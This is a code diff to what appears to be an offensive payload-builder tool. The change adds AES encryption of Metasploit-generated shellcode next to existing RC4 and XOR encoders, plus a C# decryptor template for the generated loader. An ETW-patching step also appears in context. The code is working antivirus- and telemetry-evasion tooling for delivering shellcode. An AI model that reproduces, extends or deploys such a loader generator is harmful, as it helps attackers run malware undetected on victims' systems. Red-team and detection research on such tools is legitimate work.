@@ -6,6 +6,7 @@ import sys
 import yaml
 sys.path.append('./pylib')
 import rc4_encrypt
+import aes_encrypt
 
 from pylib.libpinvoke import PINVOKE
 
@@ -154,6 +155,13 @@ SC_RC4_DECODER = """
     rc4.DecryptInPlace(shellcode);
 """
 
+# Decoder for AES shellcode
+SC_AES_DECODER = """
+  string AESKey = "{enc_key}";
+  string AESIV = "{enc_iv}";
+  shellcode = DecryptInPlace(shellcode, AESKey, AESIV);
+"""
+
 ETW_PATCH = "PatchEtw(getETWPayload());"
 
 RC4_DECRYPT_IMPORT = """
@@ -204,6 +212,31 @@ public class RC4
             Swap(S, i, j);
             int t = (S[i] + S[j]) % 256;
             ciphertext[k] = (byte)(ciphertext[k] ^ S[t]);
+        }
+    }
+}
+"""
+
+AES_DECRYPT_IMPORT = """
+private static byte[] DecryptInPlace(byte[] ciphertext, string AESKey, string AESIV)
+{
+    byte[] key = System.Text.Encoding.UTF8.GetBytes(AESKey);
+    byte[] IV = System.Text.Encoding.UTF8.GetBytes(AESIV);
+
+    using (Aes aesAlg = Aes.Create())
+    {
+        aesAlg.Key = key;
+        aesAlg.IV = IV;
+        aesAlg.Padding = PaddingMode.None;
+
+        ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
+
+        using (MemoryStream memoryStream = new MemoryStream(ciphertext))
+        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
+        {
+            int bytesRead = cryptoStream.Read(ciphertext, 0, ciphertext.Length);
+            Array.Resize(ref ciphertext, bytesRead);
+            return ciphertext;
         }
     }
 }
@@ -610,7 +643,7 @@ class Obfuscator:
 
 
 class ShellCode(Obfuscator):
-  def __init__(self, msf_cmd, xor_key=b'\00', caesar_key=0, rc4_key=None):
+  def __init__(self, msf_cmd, xor_key=b'\00', caesar_key=0, rc4_key=None, aes_key=None, aes_iv=None):
     """
     raw is the unencrypted shellcode
     key is the key used to encrypt/encode the shellcode
@@ -624,6 +657,10 @@ class ShellCode(Obfuscator):
     if rc4_key is not None:
       self.key = rc4_key
       self.encoded = rc4_encrypt.encrypt(plaintext=self.raw, key=self.key)
+    elif aes_key is not None:
+      self.key = aes_key.encode('utf-8')
+      self.iv = aes_iv.encode('utf-8')
+      self.encoded = aes_encrypt.encrypt_bytes(self.raw, self.key, self.iv)
     else:
       self.key = xor_key
       self.encoded = [ a ^ b for (a,b) in zip(self.raw, self.key*len(self.raw)) ]
